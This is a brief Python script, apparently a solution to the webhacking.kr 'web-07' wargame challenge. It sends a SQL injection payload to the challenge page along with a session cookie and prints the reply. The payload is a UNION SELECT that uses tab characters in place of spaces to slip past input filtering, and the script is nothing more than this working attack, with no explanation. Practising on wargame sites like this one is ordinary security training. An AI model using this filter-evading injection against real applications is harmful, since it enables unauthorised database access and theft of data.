import requests

url='http://webhacking.kr/challenge/web/web-07/index.php?val='
cookies={'PHPSESSID':'v8vr9tl8nj5ic89us02rjcgua2'}
data='-1)%09union%09select%09(3-1'

url=url+data
print requests.get(url,cookies=cookies).text
